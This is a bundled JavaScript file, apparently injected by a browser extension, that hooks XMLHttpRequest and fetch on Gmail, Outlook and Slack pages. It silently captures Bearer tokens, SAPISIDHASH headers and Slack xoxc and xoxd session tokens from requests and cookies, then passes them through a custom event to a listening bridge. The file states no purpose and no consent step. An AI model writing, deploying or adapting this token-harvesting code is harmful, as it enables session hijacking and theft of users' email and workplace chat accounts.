(() => {
  // ffi/interceptor.js
  (function() {
    "use strict";
    var _tokenBuffer = [];
    var _bridgeReady = false;
    var _dedupMap = /* @__PURE__ */ Object.create(null);
    var _DEDUP_TTL = 5e3;
    window.addEventListener("__KB_BRIDGE_READY__", function() {
      _bridgeReady = true;
      var buf = _tokenBuffer;
      _tokenBuffer = [];
      for (var i = 0; i < buf.length; i++) {
        emitToken(buf[i]);
      }
    });
    function extractBearer(authHeader) {
      var trimmed = authHeader.replace(/^\s+|\s+$/g, "");
      if (trimmed.indexOf("Bearer ") === 0) {
        var token = trimmed.replace(/^Bearer\s+/, "").replace(/^\s+|\s+$/g, "");
        return token !== "" ? token : null;
      }
      return null;
    }
    function extractSapisidhash(authHeader) {
      if (authHeader.indexOf("SAPISIDHASH ") === 0) {
        return authHeader;
      }
      return null;
    }
    function extractXoxc(body) {
      var m = body.match(/[&\?]?token=(xoxc-[\w-]+)/);
      if (m) return m[1];
      m = body.match(/[&\?]?token=(xox[a-z]-[\w-]+)/);
      if (m) return m[1];
      return null;
    }
    function detectPlatform(hostname) {
      if (hostname.indexOf("google") !== -1) return "gmail";
      if (hostname.indexOf("outlook") !== -1) return "outlook";
      if (hostname.indexOf("slack") !== -1) return "slack";
      if (hostname.indexOf("microsoftonline") !== -1) return "outlook";
      return "unknown";
    }
    function extractTokenFromHeader(authHeader) {
      if (!authHeader) return null;
      var bearer = extractBearer(authHeader);
      if (bearer) return { type: "bearer", token: bearer };
      var sapi = extractSapisidhash(authHeader);
      if (sapi) return { type: "sapisidhash", token: sapi };
      return null;
    }
    function extractTokenFromBody(body) {
      if (typeof body !== "string") return null;
      var token = extractXoxc(body);
      if (token) return { type: token.split("-")[0], token };
      return null;
    }
    function dedupKey(url, token) {
      return url + "|" + token;
    }
    function isDuplicate(url, token) {
      var key = dedupKey(url, token);
      var now = Date.now();
      if (_dedupMap[key] && now - _dedupMap[key] < _DEDUP_TTL) return true;
      _dedupMap[key] = now;
      return false;
    }
    function makeDetail(tokenType, token, url) {
      return {
        platform: detectPlatform(location.hostname),
        tokenType,
        token,
        url,
        timestamp: Date.now()
      };
    }
    function emitToken(detail) {
      if (!detail || !detail.token) return;
      if (isDuplicate(detail.url, detail.token)) return;
      if (_bridgeReady) {
        window.dispatchEvent(
          new CustomEvent("__KB_TOKEN__", { detail })
        );
      } else {
        _tokenBuffer.push(detail);
      }
    }
    var _origOpen = XMLHttpRequest.prototype.open;
    var _origSetHeader = XMLHttpRequest.prototype.setRequestHeader;
    var _origSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.open = function(method, url) {
      this.__kb_method = method;
      this.__kb_url = String(url);
      return _origOpen.apply(this, arguments);
    };
    XMLHttpRequest.prototype.setRequestHeader = function(name, value) {
      if (name.toLowerCase() === "authorization") {
        this.__kb_authHeader = value;
      }
      return _origSetHeader.apply(this, arguments);
    };
    XMLHttpRequest.prototype.send = function(body) {
      var url = this.__kb_url;
      if (this.__kb_authHeader) {
        var parsed = extractTokenFromHeader(this.__kb_authHeader);
        if (parsed) {
          emitToken(makeDetail(parsed.type, parsed.token, url));
        }
      }
      if (body) {
        var bodyToken = extractTokenFromBody(body);
        if (bodyToken) {
          emitToken(makeDetail(bodyToken.type, bodyToken.token, url));
        }
      }
      return _origSend.apply(this, arguments);
    };
    var _origFetch = window.fetch;
    window.fetch = function(input, init) {
      var url;
      if (typeof Request !== "undefined" && input instanceof Request) {
        url = String(input.url);
      } else {
        url = String(input);
      }
      var authHeader = null;
      if (typeof Request !== "undefined" && input instanceof Request) {
        try {
          authHeader = input.headers.get("authorization");
        } catch (e) {
        }
      }
      if (init && init.headers) {
        if (typeof init.headers.get === "function") {
          var h = init.headers.get("authorization");
          if (h) authHeader = h;
        } else if (typeof init.headers === "object") {
          var keys = Object.keys(init.headers);
          for (var i = 0; i < keys.length; i++) {
            if (keys[i].toLowerCase() === "authorization") {
              authHeader = init.headers[keys[i]];
              break;
            }
          }
        }
      }
      if (authHeader) {
        var parsed = extractTokenFromHeader(authHeader);
        if (parsed) {
          emitToken(makeDetail(parsed.type, parsed.token, url));
        }
      }
      if (init && init.body) {
        var bodyToken = extractTokenFromBody(init.body);
        if (bodyToken) {
          emitToken(makeDetail(bodyToken.type, bodyToken.token, url));
        }
      }
      return _origFetch.apply(this, arguments);
    };
    function captureSlackCookies() {
      if (location.hostname.indexOf("slack") === -1) return;
      var cookieStr = document.cookie;
      var xoxdMatch = cookieStr.match(/(?:^|;\s*)d=(xoxd-[^\s;]+)/);
      if (xoxdMatch) {
        emitToken({
          platform: "slack",
          tokenType: "xoxd",
          token: xoxdMatch[1],
          url: location.href,
          timestamp: Date.now()
        });
      }
      var xoxcMatch = cookieStr.match(/(?:^|;\s*)xoxc=([^\s;]+)/);
      if (xoxcMatch) {
        emitToken({
          platform: "slack",
          tokenType: "xoxc",
          token: xoxcMatch[1],
          url: location.href,
          timestamp: Date.now()
        });
      }
    }
    var _cookieInterval = setInterval(function() {
      if (_bridgeReady) {
        captureSlackCookies();
        clearInterval(_cookieInterval);
      }
    }, 500);
  })();
})();
